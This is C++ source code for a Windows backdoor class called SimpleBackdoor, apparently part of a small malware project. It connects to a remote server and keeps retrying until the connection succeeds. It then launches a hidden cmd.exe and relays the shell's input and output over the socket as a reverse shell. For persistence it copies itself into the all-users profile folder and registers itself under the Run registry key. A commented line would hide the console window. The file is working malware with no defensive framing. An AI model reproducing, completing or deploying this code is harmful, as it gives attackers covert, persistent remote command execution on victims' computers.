#include "simplebackdoor.h"

using namespace std;

SimpleBackdoor* SimpleBackdoor::instance = NULL;

SimpleBackdoor::SimpleBackdoor() {
    //uncomment to hide the program's console
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
}

SimpleBackdoor::~SimpleBackdoor() {
    closesocket(connectSocket);
    WSACleanup();
}

void SimpleBackdoor::log(std::string line) {
    cout << line << endl;
}

void SimpleBackdoor::connectToServer(std::string ip, std::string port) {

    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        exit(1);
    }

    struct addrinfo *info, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if(getaddrinfo(ip.c_str(), port.c_str(), &hints, &info) != 0){
        WSACleanup();
        exit(1);
    }

    connectSocket = INVALID_SOCKET;
    connectSocket = socket(info->ai_family, info->ai_socktype, info->ai_protocol);

    if (connectSocket == INVALID_SOCKET) {
        WSACleanup();
        exit(1);
    }

    log("Connecting to server...");
    while (connect(connectSocket, info->ai_addr, (int)info->ai_addrlen) == SOCKET_ERROR) {
        Sleep(10000);
    }

    freeaddrinfo(info);

    if(connectSocket == INVALID_SOCKET) {
        WSACleanup();
        exit(1);
    }
}

void SimpleBackdoor::doShell() {

    SECURITY_ATTRIBUTES saAttr;
    HANDLE readIN = NULL;
    HANDLE writeIN = NULL;
    HANDLE readOUT = NULL;
    HANDLE writeOUT = NULL;

    size_t received;
    char recvBuffer[RECV_BUFLEN];

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&readOUT, &writeOUT, &saAttr, 0);
    CreatePipe(&readIN, &writeIN, &saAttr, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;

    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );

    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = writeOUT;
    siStartInfo.hStdOutput = writeOUT;
    siStartInfo.hStdInput = readIN;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
    siStartInfo.wShowWindow = SW_HIDE;

    CreateProcess(NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfo);

    log("Started cmd.exe");

    char cmdBuffer[CMD_BUFLEN];
    DWORD read;
    DWORD bwritten;

    do {
        Sleep(1000);
        do {
            ReadFile(readOUT, cmdBuffer, CMD_BUFLEN, &read, NULL);
            send(connectSocket, cmdBuffer, read, 0);
            PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
        } while(read > 0);
        ZeroMemory(recvBuffer, RECV_BUFLEN);
        received = recv(connectSocket, recvBuffer, RECV_BUFLEN, 0);
        WriteFile(writeIN, recvBuffer, received, &bwritten, NULL);

    } while (received > 0);

    if(received == 0) {
        log("disconnected");
    }

    else {
        log("recv failed: " + WSAGetLastError());
    }
}

void SimpleBackdoor::persist(std::string programName) {

    char path[500];
    int firstLaunch;

    GetEnvironmentVariable("ALLUSERSPROFILE", path, sizeof(path));
    strcat(path, "\\");
    strcat(path, programName.c_str());

    firstLaunch = CopyFile(programName.c_str(), path, 1);
    log("Checking " + std::string(path) + "...");

    if(firstLaunch) {
        HKEY key;
        RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &key);
        RegSetValueEx(key, programName.c_str(), 0, REG_SZ, (BYTE*)path, strlen(path));
        log("Added registry key.");
    }
}

SimpleBackdoor* SimpleBackdoor::getInstance() {



    if(!instance) {
        instance = new SimpleBackdoor();
    }

    return instance;
}
